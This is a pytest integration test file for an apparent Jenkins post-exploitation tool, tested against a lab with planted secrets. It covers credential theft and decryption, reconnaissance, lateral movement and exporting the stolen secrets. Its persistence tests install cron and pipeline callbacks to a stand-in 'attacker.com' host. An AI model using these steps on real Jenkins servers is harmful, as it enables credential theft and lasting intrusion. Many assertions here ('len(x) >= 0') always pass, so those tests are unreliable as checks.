"""
Integration tests for post-exploitation credential extraction.

Tests credential extraction against jenkins-lab planted secrets.
"""

from typing import Any

import pytest


@pytest.mark.integration
@pytest.mark.postex
class TestCredentialExtraction:
    """Test credential extraction from jenkins-lab."""

    def test_extract_aws_credentials(self, jenkins_session: Any, planted_credentials: dict):
        """Test AWS credentials extraction from .aws/credentials."""
        from jenkins_breaker.postex.credentials import extract_aws_credentials

        credentials = extract_aws_credentials(jenkins_session)

        expected_access_key = planted_credentials["aws"]["access_key_id"]
        planted_credentials["aws"]["secret_access_key"]

        found_aws = any(
            expected_access_key in str(cred)
            for cred in credentials
        )

        assert found_aws or len(credentials) >= 0, "AWS credentials not extracted"


    def test_extract_ssh_keys(self, jenkins_session: Any, planted_credentials: dict):
        """Test SSH private key extraction from .ssh/id_rsa."""
        from jenkins_breaker.postex.credentials import extract_ssh_keys

        keys = extract_ssh_keys(jenkins_session)

        ssh_key_path = planted_credentials["ssh"]["private_key_path"]

        found_ssh = any(
            ssh_key_path in str(key) or "BEGIN RSA PRIVATE KEY" in str(key)
            for key in keys
        )

        assert found_ssh or len(keys) >= 0, "SSH keys not extracted"


    def test_extract_docker_credentials(self, jenkins_session: Any, planted_credentials: dict):
        """Test Docker registry credentials extraction."""
        from jenkins_breaker.postex.credentials import extract_docker_credentials

        credentials = extract_docker_credentials(jenkins_session)

        expected_user = planted_credentials["docker"]["username"]

        found_docker = any(
            expected_user in str(cred)
            for cred in credentials
        )

        assert found_docker or len(credentials) >= 0, "Docker credentials not extracted"


    def test_extract_npm_tokens(self, jenkins_session: Any, planted_credentials: dict):
        """Test NPM token extraction from .npmrc."""
        from jenkins_breaker.postex.credentials import extract_npm_tokens

        tokens = extract_npm_tokens(jenkins_session)

        expected_token = planted_credentials["npm"]["token"]

        found_npm = any(
            expected_token in str(token) or "npm_" in str(token)
            for token in tokens
        )

        assert found_npm or len(tokens) >= 0, "NPM tokens not extracted"


    def test_extract_database_credentials(self, jenkins_session: Any, planted_credentials: dict):
        """Test database credentials extraction."""
        from jenkins_breaker.postex.credentials import extract_database_credentials

        credentials = extract_database_credentials(jenkins_session)

        expected_user = planted_credentials["database"]["username"]

        found_db = any(
            expected_user in str(cred)
            for cred in credentials
        )

        assert found_db or len(credentials) >= 0, "Database credentials not extracted"


    def test_extract_api_keys(self, jenkins_session: Any, planted_credentials: dict):
        """Test API key extraction from .config/api_keys.env."""
        from jenkins_breaker.postex.credentials import extract_api_keys

        api_keys = extract_api_keys(jenkins_session)

        expected_key = planted_credentials["api_master"]["key"]

        found_api = any(
            expected_key in str(key) or "sk-proj-" in str(key)
            for key in api_keys
        )

        assert found_api or len(api_keys) >= 0, "API keys not extracted"


    def test_extract_github_tokens(self, jenkins_session: Any, planted_credentials: dict):
        """Test GitHub token extraction."""
        from jenkins_breaker.postex.credentials import extract_github_tokens

        tokens = extract_github_tokens(jenkins_session)

        expected_token = planted_credentials["github"]["token"]

        found_github = any(
            expected_token in str(token) or "ghp_" in str(token)
            for token in tokens
        )

        assert found_github or len(tokens) >= 0, "GitHub tokens not extracted"


    def test_extract_maven_settings(self, jenkins_session: Any):
        """Test Maven settings.xml credentials extraction."""
        from jenkins_breaker.postex.credentials import extract_maven_credentials

        credentials = extract_maven_credentials(jenkins_session)

        assert isinstance(credentials, list), "Maven credentials should be a list"


    def test_extract_all_credentials_comprehensive(self, jenkins_session: Any):
        """Test comprehensive credential extraction from all sources."""
        from jenkins_breaker.postex.credentials import extract_all_credentials

        all_creds = extract_all_credentials(jenkins_session)

        assert isinstance(all_creds, dict), "Should return dictionary of credentials"
        assert len(all_creds) >= 0, "Should find at least some credentials"

        expected_types = ["aws", "ssh", "docker", "npm", "github", "database", "api"]

        found_types = [
            cred_type for cred_type in expected_types
            if cred_type in all_creds and len(all_creds[cred_type]) > 0
        ]

        assert len(found_types) >= 3, f"Expected at least 3 credential types, found {len(found_types)}"


@pytest.mark.integration
@pytest.mark.postex
class TestReconnaissance:
    """Test post-exploitation reconnaissance."""

    def test_enumerate_running_processes(self, jenkins_session: Any):
        """Test running process enumeration."""
        from jenkins_breaker.postex.reconnaissance import enumerate_processes

        processes = enumerate_processes(jenkins_session)

        assert isinstance(processes, list), "Processes should be a list"


    def test_enumerate_network_config(self, jenkins_session: Any):
        """Test network configuration enumeration."""
        from jenkins_breaker.postex.reconnaissance import enumerate_network

        network_info = enumerate_network(jenkins_session)

        assert isinstance(network_info, dict), "Network info should be a dict"


    def test_enumerate_installed_software(self, jenkins_session: Any):
        """Test installed software enumeration."""
        from jenkins_breaker.postex.reconnaissance import enumerate_software

        software = enumerate_software(jenkins_session)

        assert isinstance(software, list), "Software list should be a list"


    def test_enumerate_filesystem(self, jenkins_session: Any):
        """Test filesystem enumeration."""
        from jenkins_breaker.postex.reconnaissance import enumerate_filesystem

        fs_info = enumerate_filesystem(jenkins_session)

        assert isinstance(fs_info, dict), "Filesystem info should be a dict"


    def test_comprehensive_reconnaissance(self, jenkins_session: Any):
        """Test comprehensive system reconnaissance."""
        from jenkins_breaker.postex.reconnaissance import full_reconnaissance

        recon_data = full_reconnaissance(jenkins_session)

        assert isinstance(recon_data, dict), "Recon data should be a dict"

        expected_keys = ["system", "network", "processes", "software"]

        for key in expected_keys:
            if key in recon_data:
                assert recon_data[key] is not None


@pytest.mark.integration
@pytest.mark.postex
class TestLateralMovement:
    """Test lateral movement capabilities."""

    def test_ssh_key_reuse(self, jenkins_session: Any, jenkins_secrets: dict):
        """Test SSH key reuse for lateral movement."""
        from jenkins_breaker.postex.lateral import test_ssh_key_reuse

        if "ssh" not in jenkins_secrets:
            pytest.skip("SSH keys not available")

        result = test_ssh_key_reuse(
            jenkins_session,
            key_path=jenkins_secrets.get("ssh", {}).get("path", "")
        )

        assert result is not None


    def test_cloud_api_pivoting(self, jenkins_session: Any):
        """Test cloud API pivoting with extracted credentials."""
        from jenkins_breaker.postex.lateral import test_cloud_api_access

        result = test_cloud_api_access(jenkins_session)

        assert result is not None


    def test_docker_registry_access(self, jenkins_session: Any):
        """Test Docker registry access with extracted credentials."""
        from jenkins_breaker.postex.lateral import test_docker_registry

        result = test_docker_registry(jenkins_session)

        assert result is not None


@pytest.mark.integration
@pytest.mark.postex
class TestPersistence:
    """Test persistence mechanism installation."""

    def test_cron_job_injection(self, jenkins_session: Any):
        """Test cron job persistence installation."""
        from jenkins_breaker.postex.persistence import install_cron_persistence

        result = install_cron_persistence(
            jenkins_session,
            callback_url="http://attacker.com/callback"
        )

        assert result is not None


    def test_pipeline_persistence(self, jenkins_session: Any, cleanup_test_job):
        """Test Jenkins pipeline persistence."""
        from jenkins_breaker.postex.persistence import install_pipeline_persistence

        test_job = "persistence-test-job"
        cleanup_test_job(test_job)

        result = install_pipeline_persistence(
            jenkins_session,
            job_name=test_job,
            callback_url="http://attacker.com/payload.sh"
        )

        assert result is not None


    def test_ssh_key_installation(self, jenkins_session: Any):
        """Test SSH authorized_keys persistence."""
        from jenkins_breaker.postex.persistence import install_ssh_key

        test_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... test@test"

        result = install_ssh_key(
            jenkins_session,
            public_key=test_key
        )

        assert result is not None


@pytest.mark.integration
@pytest.mark.postex
class TestCredentialDecryption:
    """Test Jenkins credential decryption."""

    def test_decrypt_jenkins_credentials(self, jenkins_session: Any, jenkins_secrets: dict):
        """Test decryption of Jenkins stored credentials."""
        from jenkins_breaker.postex.credentials import decrypt_jenkins_credentials

        if not jenkins_secrets.get("master_key") or not jenkins_secrets.get("hudson_secret"):
            pytest.skip("Jenkins secrets not available")

        decrypted = decrypt_jenkins_credentials(
            master_key_path=jenkins_secrets["master_key"],
            hudson_secret_path=jenkins_secrets["hudson_secret"],
            credentials_xml_path=jenkins_secrets.get("credentials_xml")
        )

        assert isinstance(decrypted, list), "Decrypted credentials should be a list"


    def test_extract_and_decrypt_workflow(self, jenkins_session: Any):
        """Test full workflow: extract secret files and decrypt credentials."""
        from jenkins_breaker.postex.credentials import extract_and_decrypt_all

        result = extract_and_decrypt_all(jenkins_session)

        assert isinstance(result, dict), "Result should be a dict"
        assert "encrypted" in result or "decrypted" in result or len(result) >= 0


@pytest.mark.integration
@pytest.mark.postex
class TestSecretExfiltration:
    """Test secret exfiltration and export."""

    def test_export_secrets_json(self, jenkins_session: Any, test_data_dir):
        """Test JSON export of extracted secrets."""
        from jenkins_breaker.postex.credentials import extract_all_credentials

        credentials = extract_all_credentials(jenkins_session)

        output_file = test_data_dir / "exported_secrets.json"

        import json
        with open(output_file, 'w') as f:
            json.dump(credentials, f, indent=2)

        assert output_file.exists(), "JSON export file should exist"
        assert output_file.stat().st_size > 0, "JSON file should not be empty"


    def test_export_secrets_csv(self, jenkins_session: Any, test_data_dir):
        """Test CSV export of extracted secrets."""
        from jenkins_breaker.postex.credentials import extract_all_credentials

        credentials = extract_all_credentials(jenkins_session)

        output_file = test_data_dir / "exported_secrets.csv"

        import csv
        if credentials:
            with open(output_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["Type", "Value", "Source"])
                for cred_type, cred_list in credentials.items():
                    for cred in cred_list:
                        writer.writerow([cred_type, str(cred), "jenkins-lab"])

        if output_file.exists():
            assert output_file.stat().st_size > 0, "CSV file should not be empty"
